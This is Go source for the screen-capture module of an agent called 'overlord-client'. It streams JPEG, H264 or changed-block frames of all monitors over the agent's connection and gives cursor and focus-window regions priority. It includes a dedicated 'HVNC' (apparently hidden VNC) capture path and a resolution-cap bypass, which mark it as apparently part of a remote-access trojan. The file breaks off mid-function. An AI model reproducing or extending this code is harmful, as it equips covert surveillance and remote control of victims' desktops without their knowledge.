package capture

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"image"
	"image/draw"
	"log"
	"os"
	goruntime "runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func Loop(ctx context.Context, env *rt.Env) {
	defer recoverAndLog("capture loop", env.Cancel)
	logCodecSupport()

	if env.Cfg.DisableCapture {
		log.Printf("capture: disabled by config, sending black placeholder")

		if err := sendBlackFrame(ctx, env); err != nil {
			log.Printf("capture: black frame failed: %v", err)
		}
	} else if supportsCapture() {

		done := make(chan struct{})
		goSafe("capture initial frame", env.Cancel, func() {
			defer close(done)
			restore := BypassResolutionCap()
			defer restore()
			var err error
			if goruntime.GOOS == "windows" && activeDisplays() > 1 {
				err = captureAllDisplaysAndSend(ctx, env)
			} else {
				err = CaptureAndSend(ctx, env)
			}
			if err != nil {
				log.Printf("capture: initial frame failed: %v (continuing anyway)", err)
			} else {
				log.Printf("capture: initial frame sent")
			}
		})

		select {
		case <-done:

		case <-time.After(3 * time.Second):
			log.Printf("capture: initial frame timed out after 3s (continuing anyway)")
		}
	} else {
		log.Printf("capture: no displays detected; skipping initial frame")
	}
	<-ctx.Done()
}

func Now(ctx context.Context, env *rt.Env) error {
	if env.Cfg.DisableCapture {
		return sendBlackFrame(ctx, env)
	}
	if !supportsCapture() {
		return nil
	}
	return CaptureAndSend(ctx, env)
}

func CaptureDisplayRGBA(display int) (*image.RGBA, error) {
	if !supportsCapture() {
		return nil, nil
	}
	if display < 0 || display >= safeDisplayCount() {
		display = 0
	}
	return safeCaptureDisplay(display)
}

func CaptureAndSend(ctx context.Context, env *rt.Env) error {
	defer recoverAndLog("capture send", env.Cancel)

	displays := activeDisplays()
	if displays == 0 {
		log.Printf("capture: no displays available")
		return nil
	}
	display := env.SelectedDisplay
	if display < 0 || display >= displays {
		display = 0
		log.Printf("capture: requested display %d out of range, defaulting to 0 (monitors=%d)", env.SelectedDisplay, displays)
	}
	t0 := time.Now()
	img, err := safeCaptureDisplay(display)
	if err != nil {
		img, err = safeCaptureDisplay(display)
		if err != nil && errors.Is(err, syscall.EINVAL) {
			ResetDesktopCapture()
			ResetMonitorCache()
			img, err = safeCaptureDisplay(display)
		}
	}
	if err != nil {
		log.Printf("capture: capture failed: %v (sending black frame)", err)
		return sendBlackFrame(ctx, env)
	}
	if img == nil {
		log.Printf("capture: capture returned nil image (sending black frame)")
		return sendBlackFrame(ctx, env)
	}
	captureDur := time.Since(t0)

	quality := jpegQuality()
	frame, encodeDur, err := buildFrame(img, display, quality)
	if err != nil {
		return err
	}
	now := time.Now()
	fps := frameFPS(now)
	if fps <= 0 {
		fps = 1
	}
	frame.Header.FPS = fps
	if ctx.Err() != nil {
		return nil
	}
	sendStart := time.Now()
	err = wire.WriteMsg(ctx, env.Conn, frame)
	sendDur := time.Since(sendStart)
	if shouldLogFrame(now) {
		total := time.Since(t0)
		frames := statFrames.Load()
		capAvg := avgMs(statCapNs.Load(), frames)
		encAvg := avgMs(statEncNs.Load(), frames)
		sendAvg := avgMs(statSendNs.Load(), frames)
		totalAvg := avgMs(statTotalNs.Load(), frames)
		bytesAvg := avgBytes(statBytes.Load(), frames)
		detectAvg := avgMs(statDetectNs.Load(), frames)
		mergeAvg := avgMs(statMergeNs.Load(), frames)
		blkJpegAvg := avgMs(statBlkJpegNs.Load(), frames)
		prevCopyAvg := avgMs(statPrevCopyNs.Load(), frames)
		full := statFullFrames.Load()
		blocks := statBlockFrames.Load()
		keep := statKeepaliveFrames.Load()
		regions := statBlockRegions.Load()
		fallbacks := statBlockFallbacks.Load()
		avgRegions := float64(0)
		if blocks > 0 {
			avgRegions = float64(regions) / float64(blocks)
		}
		log.Printf("capture: stream display=%d fps≈%d format=%s size=%d cap=%s enc=%s send=%s total=%s | avg cap=%.2fms enc=%.2fms send=%.2fms total=%.2fms avgSize=%.0fB frames=%d detect=%.2fms merge=%.2fms blkJpeg=%.2fms prevCopy=%.2fms full=%d blocks=%d keep=%d fallbacks=%d avgRegions=%.2f", display, fps, frame.Header.Format, len(frame.Data), captureDur, encodeDur, sendDur, total, capAvg, encAvg, sendAvg, totalAvg, bytesAvg, frames, detectAvg, mergeAvg, blkJpegAvg, prevCopyAvg, full, blocks, keep, fallbacks, avgRegions)
		resetStats()
	}

	statFrames.Add(1)
	statCapNs.Add(captureDur.Nanoseconds())
	statEncNs.Add(encodeDur.Nanoseconds())
	statSendNs.Add(sendDur.Nanoseconds())
	statTotalNs.Add(time.Since(t0).Nanoseconds())
	statBytes.Add(int64(len(frame.Data)))
	return err
}

// captureAllDisplaysAndSend stitches all monitors into a single image and sends
// it as the initial frame. Used on Windows so the dashboard thumbnail shows
// every monitor, not just the primary one.
func captureAllDisplaysAndSend(ctx context.Context, env *rt.Env) error {
	defer recoverAndLog("capture all displays send", env.Cancel)

	n := activeDisplays()
	if n <= 0 {
		return nil
	}

	type monCapture struct {
		bounds image.Rectangle
		img    *image.RGBA
	}
	parts := make([]monCapture, 0, n)
	minX, minY := int(1e9), int(1e9)
	maxX, maxY := int(-1e9), int(-1e9)

	for i := 0; i < n; i++ {
		bounds := displayBounds(i)
		img, err := safeCaptureDisplay(i)
		if err != nil || img == nil {
			log.Printf("capture: all-displays: display %d failed: %v, falling back to single", i, err)
			return CaptureAndSend(ctx, env)
		}
		parts = append(parts, monCapture{bounds: bounds, img: img})
		if bounds.Min.X < minX {
			minX = bounds.Min.X
		}
		if bounds.Min.Y < minY {
			minY = bounds.Min.Y
		}
		if bounds.Max.X > maxX {
			maxX = bounds.Max.X
		}
		if bounds.Max.Y > maxY {
			maxY = bounds.Max.Y
		}
	}

	// Compute per-monitor scale factors to handle resolution-cap or DPI
	// mismatches between displayBounds (virtual coords) and captured pixels.
	type scaledPart struct {
		img    *image.RGBA
		scaleX float64
		scaleY float64
		offX   int
		offY   int
	}
	scaled := make([]scaledPart, len(parts))
	for i, part := range parts {
		sx, sy := 1.0, 1.0
		bw := part.bounds.Dx()
		bh := part.bounds.Dy()
		iw := part.img.Rect.Dx()
		ih := part.img.Rect.Dy()
		if bw > 0 && iw > 0 {
			sx = float64(iw) / float64(bw)
		}
		if bh > 0 && ih > 0 {
			sy = float64(ih) / float64(bh)
		}
		scaled[i] = scaledPart{
			img:    part.img,
			scaleX: sx,
			scaleY: sy,
			offX:   int(float64(part.bounds.Min.X-minX) * sx),
			offY:   int(float64(part.bounds.Min.Y-minY) * sy),
		}
	}

	// Canvas sized from scaled image placements.
	cW, cH := 0, 0
	for _, sp := range scaled {
		rx := sp.offX + sp.img.Rect.Dx()
		ry := sp.offY + sp.img.Rect.Dy()
		if rx > cW {
			cW = rx
		}
		if ry > cH {
			cH = ry
		}
	}
	canvas := image.NewRGBA(image.Rect(0, 0, cW, cH))
	for _, sp := range scaled {
		dst := image.Rect(sp.offX, sp.offY, sp.offX+sp.img.Rect.Dx(), sp.offY+sp.img.Rect.Dy())
		draw.Draw(canvas, dst, sp.img, sp.img.Rect.Min, draw.Src)
	}

	quality := jpegQuality()
	frame, _, err := buildFrame(canvas, 0, quality)
	if err != nil {
		return err
	}
	frame.Header.FPS = 1
	log.Printf("capture: all-displays initial frame %dx%d (%d monitors)", canvas.Rect.Dx(), canvas.Rect.Dy(), n)
	return wire.WriteMsg(ctx, env.Conn, frame)
}

func supportsCapture() bool {
	return safeActiveDisplays() > 0
}

func safeActiveDisplays() int {
	defer func() {
		_ = recover()
	}()
	return activeDisplays()
}

func safeCaptureDisplay(display int) (*image.RGBA, error) {
	defer func() {
		_ = recover()
	}()
	img, err := captureDisplayFn(display)
	if err != nil {
		return nil, err
	}
	return img, nil
}

func safeDisplayCount() int {
	defer func() {
		_ = recover()
	}()
	return displayCount()
}

func sendBlackFrame(ctx context.Context, env *rt.Env) error {
	if ctx.Err() != nil {
		return nil
	}

	img := image.NewRGBA(image.Rect(0, 0, 64, 64))

	quality := 60
	frame, _, err := buildFrame(img, 0, quality)
	if err != nil {
		return err
	}
	frame.Header.FPS = 1
	return wire.WriteMsg(ctx, env.Conn, frame)
}

func MonitorCount() int {
	n := safeDisplayCount()
	if n <= 0 {
		return 1
	}
	return n
}

const frameLogInterval = 5 * time.Second

var (
	fpsWindowStart atomic.Int64
	fpsCount       atomic.Int64
	fpsLatest      atomic.Int64
	lastFrameLog   atomic.Int64
	lastKeyframe   atomic.Int64
	fullNextFrames atomic.Int64

	statFrames          atomic.Int64
	statCapNs           atomic.Int64
	statEncNs           atomic.Int64
	statSendNs          atomic.Int64
	statTotalNs         atomic.Int64
	statBytes           atomic.Int64
	statDetectNs        atomic.Int64
	statMergeNs         atomic.Int64
	statBlkJpegNs       atomic.Int64
	statPrevCopyNs      atomic.Int64
	statFullFrames      atomic.Int64
	statBlockFrames     atomic.Int64
	statKeepaliveFrames atomic.Int64
	statBlockRegions    atomic.Int64
	statBlockFallbacks  atomic.Int64

	overrideQuality atomic.Int64
	overrideCodec   atomic.Value
	h264WarnOnce    sync.Once
	codecLogOnce    sync.Once

	prevMu    sync.Mutex
	prevFrame *prevImage
)

type prevImage struct {
	w   int
	h   int
	pix []byte
}

func logCodecSupport() {
	codecLogOnce.Do(func() {
		if h264Available() {
			detail := h264AvailabilityDetail()
			if detail != "" {
				log.Printf("capture: codec support h264=enabled (%s) jpeg=enabled", detail)
				return
			}
			log.Printf("capture: codec support h264=enabled jpeg=enabled")
			return
		}
		detail := h264AvailabilityDetail()
		if detail != "" {
			log.Printf("capture: codec support h264=disabled (%s), jpeg=enabled", detail)
			return
		}
		log.Printf("capture: codec support h264=disabled, jpeg=enabled")
	})
}

func frameFPS(now time.Time) int {
	start := fpsWindowStart.Load()
	if start == 0 {
		if fpsWindowStart.CompareAndSwap(0, now.UnixNano()) {
			fpsCount.Store(1)
			return int(fpsLatest.Load())
		}
		start = fpsWindowStart.Load()
	}

	fpsCount.Add(1)
	elapsed := time.Duration(now.UnixNano() - start)
	if elapsed >= time.Second {
		frames := fpsCount.Swap(0)
		if frames > 0 {
			fps := int(float64(frames) / elapsed.Seconds())
			fpsLatest.Store(int64(fps))
		}
		fpsWindowStart.Store(now.UnixNano())
	}

	return int(fpsLatest.Load())
}

func shouldLogFrame(now time.Time) bool {
	last := time.Unix(0, lastFrameLog.Load())
	if now.Sub(last) >= frameLogInterval {
		lastFrameLog.Store(now.UnixNano())
		return true
	}
	return false
}

func requestFullFrames(count int) {
	if count <= 0 {
		return
	}
	fullNextFrames.Store(int64(count))
}

func consumeFullFrame() bool {
	for {
		val := fullNextFrames.Load()
		if val <= 0 {
			return false
		}
		if fullNextFrames.CompareAndSwap(val, val-1) {
			return true
		}
	}
}

func ResetPrev() {
	prevMu.Lock()
	prevFrame = nil
	prevMu.Unlock()
	lastKeyframe.Store(0)
	requestFullFrames(2)
	resetH264Encoder()
}

func jpegQuality() int {

	if q := overrideQuality.Load(); q > 0 {
		return int(q)
	}
	q := int(loadOnceInt(&cachedJPEGQuality, 95))
	if q < 20 {
		q = 20
	}
	if q > 100 {
		q = 100
	}
	return q
}

var (
	jpegQualityOnce   sync.Once
	cachedJPEGQuality int64
	blockCodecOnce    sync.Once
	cachedBlockCodec  string
)

func loadOnceInt(target *int64, def int) int64 {
	jpegQualityOnce.Do(func() {
		if env := os.Getenv("OVERLORD_JPEG_QUALITY"); env != "" {
			if v, err := strconv.Atoi(env); err == nil {
				*target = int64(v)
				return
			}
		}
		*target = int64(def)
	})
	return atomic.LoadInt64(target)
}

func resetStats() {
	statFrames.Store(0)
	statCapNs.Store(0)
	statEncNs.Store(0)
	statSendNs.Store(0)
	statTotalNs.Store(0)
	statBytes.Store(0)
	statDetectNs.Store(0)
	statMergeNs.Store(0)
	statBlkJpegNs.Store(0)
	statPrevCopyNs.Store(0)
	statFullFrames.Store(0)
	statBlockFrames.Store(0)
	statKeepaliveFrames.Store(0)
	statBlockRegions.Store(0)
	statBlockFallbacks.Store(0)
}

func avgMs(ns int64, frames int64) float64 {
	if frames == 0 {
		return 0
	}
	return float64(ns) / 1e6 / float64(frames)
}

func avgBytes(b int64, frames int64) float64 {
	if frames == 0 {
		return 0
	}
	return float64(b) / float64(frames)
}

const (
	blockSize       = 64
	maxBlockRatio   = 0.40
	keyframeEvery   = 5 * time.Second
	enableBlocks    = true
	samplingRate    = 3
	minBlockSize    = 32
	changeThresh    = 3
	blockMargin     = 8
	blockCodecEnv   = "OVERLORD_BLOCK_CODEC"
	cursorROIMargin = 32
	windowROIMargin = 12

	hvncSamplingRate = 1
	hvncChangeThresh = 1
)

func buildFrame(img *image.RGBA, display int, quality int) (wire.Frame, time.Duration, error) {
	encStart := time.Now()
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	full := false
	now := time.Now()
	codec := blockCodec()

	if codec == "h264" {
		if width%2 != 0 || height%2 != 0 {
			log.Printf("capture: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", width, height)
			codec = "jpeg"
		} else {
			h264Bytes, err := encodeH264Frame(img)
			if err == nil && len(h264Bytes) > 0 {
				prevMu.Lock()
				copyPrev(img)
				prevMu.Unlock()
				lastKeyframe.Store(now.UnixNano())
				statFullFrames.Add(1)
				return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "h264"}, Data: h264Bytes}, time.Since(encStart), nil
			}
			h264WarnOnce.Do(func() {
				detail := h264AvailabilityDetail()
				if detail != "" {
					log.Printf("capture: h264 encode unavailable, falling back to jpeg: %v (%s)", err, detail)
					return
				}
				log.Printf("capture: h264 encode unavailable, falling back to jpeg: %v", err)
			})
			codec = "jpeg"
		}
	}

	if !enableBlocks {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg"}, Data: jpegBytes}, time.Since(encStart), err
	}

	prevMu.Lock()
	pf := prevFrame
	prevMu.Unlock()

	if pf == nil || pf.w != width || pf.h != height {
		full = true
	}

	if consumeFullFrame() {
		full = true
	}

	if !full && keyframeEvery > 0 {
		last := time.Unix(0, lastKeyframe.Load())
		if now.Sub(last) >= keyframeEvery {
			full = true
		}
	}

	if full {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		lastKeyframe.Store(now.UnixNano())
		statFullFrames.Add(1)
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg"}, Data: jpegBytes}, time.Since(encStart), err
	}

	blocks, blockPayload, encDur, err := encodeBlocks(img, pf, quality, codec, display)
	if err != nil {
		return wire.Frame{}, encDur, err
	}

	if blocks == 0 {
		// Keepalive frames indicate no block-level changes, so avoid copying the
		// full RGBA buffer into prevFrame again.
		statKeepaliveFrames.Add(1)
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "blocks"}, Data: blockPayload}, encDur, nil
	}

	totalBlocks := ((width + blockSize - 1) / blockSize) * ((height + blockSize - 1) / blockSize)
	changedRatio := float64(blocks) / float64(totalBlocks)

	if changedRatio > maxBlockRatio {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		lastKeyframe.Store(now.UnixNano())
		statBlockFallbacks.Add(1)
		statFullFrames.Add(1)
		return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg"}, Data: jpegBytes}, time.Since(encStart), err
	}

	statBlockFrames.Add(1)
	statBlockRegions.Add(int64(blocks))
	format := "blocks"
	if codec == "raw" {
		format = "blocks_raw"
	}
	return wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: format}, Data: blockPayload}, encDur, nil
}

func buildFrameHVNC(img *image.RGBA, display int, quality int) (wire.Frame, time.Duration, error) {
	encStart := time.Now()
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	codec := blockCodec()

	now := time.Now()
	if codec == "h264" {
		if width%2 != 0 || height%2 != 0 {
			log.Printf("hvnc capture: h264 skipped for odd dimensions (%dx%d), falling back to jpeg", width, height)
			codec = "jpeg"
		} else {
			h264Bytes, err := encodeH264Frame(img)
			if err == nil && len(h264Bytes) > 0 {
				prevMu.Lock()
				copyPrev(img)
				prevMu.Unlock()
				lastKeyframe.Store(now.UnixNano())
				statFullFrames.Add(1)
				frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "h264", HVNC: true}, Data: h264Bytes}
				return frame, time.Since(encStart), nil
			}
			h264WarnOnce.Do(func() {
				detail := h264AvailabilityDetail()
				if detail != "" {
					log.Printf("hvnc capture: h264 encode unavailable, falling back to jpeg: %v (%s)", err, detail)
					return
				}
				log.Printf("hvnc capture: h264 encode unavailable, falling back to jpeg: %v", err)
			})
			codec = "jpeg"
		}
	}

	prevMu.Lock()
	pf := prevFrame
	prevMu.Unlock()

	if pf == nil || pf.w != width || pf.h != height || now.Sub(time.Unix(0, lastKeyframe.Load())) > keyframeEvery {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		lastKeyframe.Store(now.UnixNano())
		statFullFrames.Add(1)
		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg", HVNC: true}, Data: jpegBytes}
		return frame, time.Since(encStart), err
	}

	// use strict block detection for HVNC otherwise half the time it just doesn't fucking update pictures
	// because of how slow the capture shit is.
	blocks, blockPayload, encDur, err := encodeBlocksHVNC(img, pf, quality, codec, display)
	if err != nil {
		return wire.Frame{}, encDur, err
	}

	if blocks == 0 {
		// Keepalive frames indicate no block-level changes, so avoid copying the
		// full RGBA buffer into prevFrame again.
		statKeepaliveFrames.Add(1)
		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "blocks", HVNC: true}, Data: blockPayload}
		return frame, encDur, nil
	}

	totalBlocks := ((width + blockSize - 1) / blockSize) * ((height + blockSize - 1) / blockSize)
	changedRatio := float64(blocks) / float64(totalBlocks)

	if changedRatio > maxBlockRatio {
		jpegBytes, err := encodeJPEG(img, quality)
		prevMu.Lock()
		copyPrev(img)
		prevMu.Unlock()
		lastKeyframe.Store(now.UnixNano())
		statBlockFallbacks.Add(1)
		statFullFrames.Add(1)
		frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: "jpeg", HVNC: true}, Data: jpegBytes}
		return frame, time.Since(encStart), err
	}

	statBlockFrames.Add(1)
	statBlockRegions.Add(int64(blocks))
	format := "blocks"
	if codec == "raw" {
		format = "blocks_raw"
	}
	frame := wire.Frame{Type: "frame", Header: wire.FrameHeader{Monitor: display, FPS: 0, Format: format, HVNC: true}, Data: blockPayload}
	return frame, encDur, nil
}

type streamRegion struct{ x, y, w, h int }

type roiHint struct {
	rect   image.Rectangle
	weight int
}

func encodeBlocks(img *image.RGBA, prev *prevImage, quality int, codec string, display int) (int, []byte, time.Duration, error) {
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	stride := img.Stride
	prevStride := prev.w * 4
	rois := collectROIHints(display, width, height)

	blocksWide := (width + blockSize - 1) / blockSize
	blocksHigh := (height + blockSize - 1) / blockSize
	changedGrid := make([]bool, blocksWide*blocksHigh)

	changedCount := 0
	passDetectStart := time.Now()
	for by := 0; by < blocksHigh; by++ {
		for bx := 0; bx < blocksWide; bx++ {
			x := bx * blockSize
			y := by * blockSize
			ww := blockSize
			hh := blockSize
			if x+ww > width {
				ww = width - x
			}
			if y+hh > height {
				hh = height - y
			}

			changed := blockChanged(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh)
			if !changed && blockIntersectsROI(x, y, ww, hh, rois) {
				changed = blockChangedHVNC(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh)
			}
			if changed {
				changedGrid[by*blocksWide+bx] = true
				changedCount++
			}
		}
	}

	statDetectNs.Add(time.Since(passDetectStart).Nanoseconds())

	if changedCount == 0 {
		buf := bytes.Buffer{}
		_ = binary.Write(&buf, binary.LittleEndian, uint16(width))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(height))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(0))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(0))
		return 0, buf.Bytes(), 0, nil
	}

	mergeStart := time.Now()
	var regions []streamRegion
	visited := make([]bool, len(changedGrid))

	for by := 0; by < blocksHigh; by++ {
		for bx := 0; bx < blocksWide; bx++ {
			idx := by*blocksWide + bx
			if !changedGrid[idx] || visited[idx] {
				continue
			}

			endX := bx
			for endX+1 < blocksWide && changedGrid[by*blocksWide+endX+1] && !visited[by*blocksWide+endX+1] {
				endX++
			}

			endY := by
			canExpandY := true
			for canExpandY && endY+1 < blocksHigh {
				for tx := bx; tx <= endX; tx++ {
					if !changedGrid[(endY+1)*blocksWide+tx] || visited[(endY+1)*blocksWide+tx] {
						canExpandY = false
						break
					}
				}
				if canExpandY {
					endY++
				}
			}

			for ry := by; ry <= endY; ry++ {
				for rx := bx; rx <= endX; rx++ {
					visited[ry*blocksWide+rx] = true
				}
			}

			x := bx * blockSize
			y := by * blockSize
			w := ((endX + 1) * blockSize)
			h := ((endY + 1) * blockSize)

			if x >= blockMargin {
				x -= blockMargin
				w += blockMargin
			} else {
				w += x
				x = 0
			}
			if y >= blockMargin {
				y -= blockMargin
				h += blockMargin
			} else {
				h += y
				y = 0
			}

			w += blockMargin
			h += blockMargin

			if w > width {
				w = width
			}
			if h > height {
				h = height
			}
			w -= x
			h -= y

			regions = append(regions, streamRegion{x: x, y: y, w: w, h: h})
		}
	}
	sortRegionsByROI(regions, rois)

	statMergeNs.Add(time.Since(mergeStart).Nanoseconds())

	buf := bytes.Buffer{}
	_ = binary.Write(&buf, binary.LittleEndian, uint16(width))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(height))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(len(regions)))
	_ = binary.Write(&buf, binary.LittleEndian, uint16(0))

	totalEncDur := time.Duration(0)
	for _, r := range regions {
		t0 := time.Now()
		var payload []byte
		var err error
		if codec == "raw" {
			payload = encodeBlockRaw(img, r.x, r.y, r.w, r.h)
		} else {

			blockQuality := quality + 10
			if blockQuality > 100 {
				blockQuality = 100
			}
			payload, err = encodeJPEG(img.SubImage(image.Rect(r.x, r.y, r.x+r.w, r.y+r.h)), blockQuality)
		}
		blockDur := time.Since(t0)
		totalEncDur += blockDur
		statBlkJpegNs.Add(blockDur.Nanoseconds())
		if err != nil {
			return len(regions), nil, totalEncDur, err
		}
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.x))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.y))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.w))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(r.h))
		_ = binary.Write(&buf, binary.LittleEndian, uint32(len(payload)))
		buf.Write(payload)
	}

	prevCopyStart := time.Now()
	prevMu.Lock()
	copyPrev(img)
	prevMu.Unlock()
	statPrevCopyNs.Add(time.Since(prevCopyStart).Nanoseconds())

	return len(regions), buf.Bytes(), totalEncDur, nil
}

func blockChanged(cur, prev []byte, curStride, prevStride int, x, y, w, h int) bool {
	changedPixels := 0
	sampledPixels := 0

	for row := 0; row < h; row += samplingRate {
		for col := 0; col < w; col += samplingRate {
			sampledPixels++
			ci := (y+row)*curStride + (x+col)*4
			pi := (y+row)*prevStride + (x+col)*4

			if ci+3 >= len(cur) || pi+3 >= len(prev) {
				continue
			}

			dr := int(cur[ci]) - int(prev[pi])
			dg := int(cur[ci+1]) - int(prev[pi+1])
			db := int(cur[ci+2]) - int(prev[pi+2])

			if dr < 0 {
				dr = -dr
			}
			if dg < 0 {
				dg = -dg
			}
			if db < 0 {
				db = -db
			}

			if dr > changeThresh || dg > changeThresh || db > changeThresh {
				changedPixels++

				if sampledPixels > 20 && changedPixels*33 > sampledPixels {
					return true
				}
			}
		}
	}

	if sampledPixels == 0 {
		return false
	}
	return changedPixels*33 > sampledPixels
}

func collectROIHints(display, width, height int) []roiHint {
	frame := image.Rect(0, 0, width, height)
	bounds := DisplayBounds(display)
	out := make([]roiHint, 0, 2)
	add := func(abs image.Rectangle, weight int, margin int) {
		if abs.Dx() <= 0 || abs.Dy() <= 0 {
			return
		}
		abs = expandRect(abs, margin)
		local := image.Rect(
			abs.Min.X-bounds.Min.X,
			abs.Min.Y-bounds.Min.Y,
			abs.Max.X-bounds.Min.X,
			abs.Max.Y-bounds.Min.Y,
		).Intersect(frame)
		if local.Dx() > 0 && local.Dy() > 0 {
			out = append(out, roiHint{rect: local, weight: weight})
		}
	}
	if r, ok := cursorROI(); ok {
		add(r, 3, cursorROIMargin)
	}
	if r, ok := focusWindowROI(); ok {
		add(r, 2, windowROIMargin)
	}
	return out
}

func expandRect(r image.Rectangle, margin int) image.Rectangle {
	if margin <= 0 {
		return r
	}
	return image.Rect(r.Min.X-margin, r.Min.Y-margin, r.Max.X+margin, r.Max.Y+margin)
}

func blockIntersectsROI(x, y, w, h int, hints []roiHint) bool {
	if len(hints) == 0 {
		return false
	}
	block := image.Rect(x, y, x+w, y+h)
	for _, h := range hints {
		if block.Overlaps(h.rect) {
			return true
		}
	}
	return false
}

func overlapArea(a, b image.Rectangle) int {
	r := a.Intersect(b)
	if r.Dx() <= 0 || r.Dy() <= 0 {
		return 0
	}
	return r.Dx() * r.Dy()
}

func regionPriority(r streamRegion, hints []roiHint) int {
	if len(hints) == 0 {
		return 0
	}
	rr := image.Rect(r.x, r.y, r.x+r.w, r.y+r.h)
	score := 0
	for _, h := range hints {
		score += overlapArea(rr, h.rect) * h.weight
	}
	return score
}

func sortRegionsByROI(regions []streamRegion, hints []roiHint) {
	if len(regions) < 2 || len(hints) == 0 {
		return
	}
	sort.SliceStable(regions, func(i, j int) bool {
		si := regionPriority(regions[i], hints)
		sj := regionPriority(regions[j], hints)
		if si != sj {
			return si > sj
		}
		if regions[i].y != regions[j].y {
			return regions[i].y < regions[j].y
		}
		return regions[i].x < regions[j].x
	})
}

func blockChangedHVNC(cur, prev []byte, curStride, prevStride int, x, y, w, h int) bool {
	changedPixels := 0
	sampledPixels := 0

	for row := 0; row < h; row += hvncSamplingRate {
		for col := 0; col < w; col += hvncSamplingRate {
			sampledPixels++
			ci := (y+row)*curStride + (x+col)*4
			pi := (y+row)*prevStride + (x+col)*4

			if ci+3 >= len(cur) || pi+3 >= len(prev) {
				continue
			}

			dr := int(cur[ci]) - int(prev[pi])
			dg := int(cur[ci+1]) - int(prev[pi+1])
			db := int(cur[ci+2]) - int(prev[pi+2])

			if dr < 0 {
				dr = -dr
			}
			if dg < 0 {
				dg = -dg
			}
			if db < 0 {
				db = -db
			}

			if dr > hvncChangeThresh || dg > hvncChangeThresh || db > hvncChangeThresh {
				changedPixels++

				if sampledPixels > 20 && changedPixels*100 > sampledPixels {
					return true
				}
			}
		}
	}

	if sampledPixels == 0 {
		return false
	}
	return changedPixels*100 > sampledPixels
}

func encodeBlocksHVNC(img *image.RGBA, prev *prevImage, quality int, codec string, display int) (int, []byte, time.Duration, error) {
	width := img.Bounds().Dx()
	height := img.Bounds().Dy()
	stride := img.Stride
	prevStride := prev.w * 4
	rois := collectROIHints(display, width, height)

	blocksWide := (width + blockSize - 1) / blockSize
	blocksHigh := (height + blockSize - 1) / blockSize
	changedGrid := make([]bool, blocksWide*blocksHigh)

	changedCount := 0
	passDetectStart := time.Now()
	for by := 0; by < blocksHigh; by++ {
		for bx := 0; bx < blocksWide; bx++ {
			x := bx * blockSize
			y := by * blockSize
			ww := blockSize
			hh := blockSize
			if x+ww > width {
				ww = width - x
			}
			if y+hh > height {
				hh = height - y
			}

			if blockChangedHVNC(img.Pix, prev.pix, stride, prevStride, x, y, ww, hh) {
				changedGrid[by*blocksWide+bx] = true
				changedCount++
			}
		}
	}

	statDetectNs.Add(time.Since(passDetectStart).Nanoseconds())

	if changedCount == 0 {
		buf := bytes.Buffer{}
		_ = binary.Write(&buf, binary.LittleEndian, uint16(width))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(height))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(0))
		_ = binary.Write(&buf, binary.LittleEndian, uint16(0))
		return 0, buf.Bytes(), 0, nil
	}

	mergeStart := time.Now()
	var regions []streamRegion
	visited := make([]bool, len(changedGrid))

	for by := 0; by < blocksHigh; by++ {
		for bx := 0; bx < blocksWide; bx++ {
			idx := by*blocksWide + bx
			if !changedGrid[idx] || visited[idx] {
				continue
			}

			endX := bx
			for endX+1 < blocksWide && changedGrid[by*blocksWide+endX+1] && !visited[by*blocksWide+endX+1] {
				endX++
			}

			endY := by
			canExpandY := true
			for canExpandY && endY+1 < blocksHigh {
				for tx := bx; tx <= endX; tx++ {
					if !changedGrid[(endY+1)*blocksWide+tx] || visited[(endY+1)*blocksWide+tx] {
						canExpandY = false
						break
					}
				}
				if canExpandY {
					endY++
				}
			}

			for ry := by; ry <= endY; ry++ {
				for rx := bx; rx <= endX; rx++ {
					visited[ry*blocksWide+rx] = true
				}
			}

			x := bx * blockSize
			y := by * blockSize
			w := ((endX + 1) * blockSize)
			h := ((endY + 1) * blockSize)

			if x >= blockMargin {
				x -= blockMargin
				w += blockMargin
			} else {
				w += x
				x = 0
			}
			if y >= blockMargin {
				y -= blockMargin
				h += blockMargin
			} else {
				h += y
				y = 0
			}

			w += blockMargin
			h += blockMargin

			if w > width {
				w = width
			}
			if h > height {
				h = height
			}
			w -= x
			h -= y

